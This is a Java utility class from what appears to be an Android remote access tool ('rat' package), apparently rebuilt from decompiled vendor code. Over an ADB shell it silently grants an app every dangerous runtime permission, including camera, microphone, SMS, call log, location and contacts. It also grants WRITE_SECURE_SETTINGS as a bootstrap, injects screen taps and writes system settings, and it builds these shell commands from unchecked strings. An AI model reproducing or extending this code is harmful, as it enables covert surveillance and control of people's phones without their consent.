package com.vendor.rat.adb;

import android.util.Log;

/**
 * ADB shell command builder and executor.
 * Static utility class for building and executing common ADB shell commands.
 *
 * Vendor: h/e.java N()/O()/P()/Q() + permission grant patterns
 */
public final class AdbShellExecutor {

    private static final String TAG = "AdbShellExecutor";

    private AdbShellExecutor() {}

    // ========== Dangerous permissions list ==========

    /** All Android dangerous (runtime) permissions that require user grant. */
    public static final String[] DANGEROUS_PERMISSIONS = {
        // Calendar
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR",
        // Camera
        "android.permission.CAMERA",
        // Contacts
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.GET_ACCOUNTS",
        // Location
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        // Microphone
        "android.permission.RECORD_AUDIO",
        // Phone
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_PHONE_NUMBERS",
        "android.permission.CALL_PHONE",
        "android.permission.ANSWER_PHONE_CALLS",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
        "android.permission.ADD_VOICEMAIL",
        "android.permission.USE_SIP",
        "android.permission.PROCESS_OUTGOING_CALLS",
        // Sensors
        "android.permission.BODY_SENSORS",
        "android.permission.BODY_SENSORS_BACKGROUND",
        // SMS
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_WAP_PUSH",
        "android.permission.RECEIVE_MMS",
        // Storage
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        // Nearby devices (Android 12+)
        "android.permission.BLUETOOTH_SCAN",
        "android.permission.BLUETOOTH_ADVERTISE",
        "android.permission.BLUETOOTH_CONNECT",
        "android.permission.NEARBY_WIFI_DEVICES",
        // Notifications (Android 13+)
        "android.permission.POST_NOTIFICATIONS",
    };

    // ========== Command builders ==========

    /**
     * Build a "pm grant" command string.
     *
     * @param packageName Target package
     * @param permission  Permission to grant (e.g., "android.permission.CAMERA")
     * @return Shell command string, or null if inputs are invalid
     */
    public static String buildGrantCommand(String packageName, String permission) {
        if (packageName == null || permission == null) return null;
        if (packageName.isEmpty() || permission.isEmpty()) return null;
        return "pm grant " + packageName + " " + permission;
    }

    /**
     * Build a "settings put" command string.
     *
     * @param namespace Settings namespace (global, secure, system)
     * @param key       Setting key
     * @param value     Setting value
     * @return Shell command string, or null if inputs are invalid
     */
    public static String buildSettingsCommand(String namespace, String key, String value) {
        if (namespace == null || key == null || value == null) return null;
        if (namespace.isEmpty() || key.isEmpty()) return null;
        return "settings put " + namespace + " " + key + " " + value;
    }

    /**
     * Build an "input tap" command string.
     *
     * @param x X coordinate
     * @param y Y coordinate
     * @return Shell command string
     */
    public static String buildInputTapCommand(int x, int y) {
        return "input tap " + x + " " + y;
    }

    /**
     * Build an "input swipe" command string.
     *
     * @param x1       Start X
     * @param y1       Start Y
     * @param x2       End X
     * @param y2       End Y
     * @param duration Duration in milliseconds
     * @return Shell command string
     */
    public static String buildInputSwipeCommand(int x1, int y1, int x2, int y2, int duration) {
        return "input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " " + duration;
    }

    /**
     * Build an "input text" command string.
     *
     * @param text Text to input (spaces will be escaped)
     * @return Shell command string, or null if text is null
     */
    public static String buildInputTextCommand(String text) {
        if (text == null) return null;
        // Replace spaces with %s for input command
        return "input text " + text.replace(" ", "%s");
    }

    // ========== Executors (require active ADB connection) ==========

    /**
     * Grant a single permission to a package via ADB shell.
     *
     * @param packageName Target package
     * @param permission  Permission to grant
     * @return true if grant succeeded
     */
    public static boolean grantPermission(String packageName, String permission) {
        String cmd = buildGrantCommand(packageName, permission);
        if (cmd == null) return false;

        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null || !mgr.isAdbConnected()) {
            Log.w(TAG, "grantPermission: ADB not connected");
            return false;
        }

        AdbConnectionManager.AdbShellResult result = mgr.executeShell(cmd);
        if (result != null && result.isSuccess()) {
            String output = result.getOutput();
            // pm grant returns empty output on success, or error text on failure
            boolean granted = output == null || output.isEmpty()
                || !output.toLowerCase().contains("exception")
                    && !output.toLowerCase().contains("error")
                    && !output.toLowerCase().contains("unknown permission");
            if (granted) {
                Log.d(TAG, "Granted: " + permission + " to " + packageName);
            } else {
                Log.w(TAG, "Grant failed: " + permission + " output=" + output);
            }
            return granted;
        }
        return false;
    }

    /**
     * Grant all dangerous permissions to a package via ADB shell.
     *
     * @param packageName Target package
     * @return Number of permissions successfully granted
     */
    public static int grantAllPermissions(String packageName) {
        if (packageName == null || packageName.isEmpty()) return 0;

        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null || !mgr.isAdbConnected()) {
            Log.w(TAG, "grantAllPermissions: ADB not connected");
            return 0;
        }

        int granted = 0;
        for (String perm : DANGEROUS_PERMISSIONS) {
            try {
                if (grantPermission(packageName, perm)) {
                    granted++;
                }
            } catch (Exception e) {
                Log.w(TAG, "grantPermission failed for " + perm, e);
            }
        }
        Log.d(TAG, "grantAllPermissions: " + granted + "/" + DANGEROUS_PERMISSIONS.length
            + " granted for " + packageName);
        return granted;
    }

    /**
     * Grant WRITE_SECURE_SETTINGS permission. This is the key bootstrapping permission
     * that allows SecureSettingsWriter to function.
     *
     * @param packageName Target package (usually own package)
     * @return true if grant succeeded
     */
    public static boolean grantWriteSecureSettings(String packageName) {
        if (packageName == null || packageName.isEmpty()) return false;

        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null || !mgr.isAdbConnected()) {
            Log.w(TAG, "grantWriteSecureSettings: ADB not connected");
            return false;
        }

        String cmd = "pm grant " + packageName + " android.permission.WRITE_SECURE_SETTINGS";
        AdbConnectionManager.AdbShellResult result = mgr.executeShell(cmd);
        boolean success = result != null && result.isSuccess()
            && (result.getOutput() == null || result.getOutput().isEmpty()
                || !result.getOutput().toLowerCase().contains("exception"));

        if (success) {
            Log.d(TAG, "WRITE_SECURE_SETTINGS granted to " + packageName);
        } else {
            Log.w(TAG, "WRITE_SECURE_SETTINGS grant failed for " + packageName);
        }
        return success;
    }

    /**
     * Execute input tap at coordinates via ADB shell.
     * Vendor: h/e.java c0() pattern.
     *
     * @param x X coordinate
     * @param y Y coordinate
     * @return true if tap succeeded
     */
    public static boolean inputTap(int x, int y) {
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null || !mgr.isAdbConnected()) {
            Log.w(TAG, "inputTap: ADB not connected");
            return false;
        }
        return mgr.executeShellExpect(buildInputTapCommand(x, y), "");
    }

    /**
     * Execute a settings put command via ADB shell.
     *
     * @param namespace Settings namespace
     * @param key       Setting key
     * @param value     Setting value
     * @return true if command succeeded
     */
    public static boolean putSettings(String namespace, String key, String value) {
        String cmd = buildSettingsCommand(namespace, key, value);
        if (cmd == null) return false;

        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr == null || !mgr.isAdbConnected()) {
            Log.w(TAG, "putSettings: ADB not connected");
            return false;
        }

        AdbConnectionManager.AdbShellResult result = mgr.executeShell(cmd);
        return result != null && result.isSuccess();
    }
}
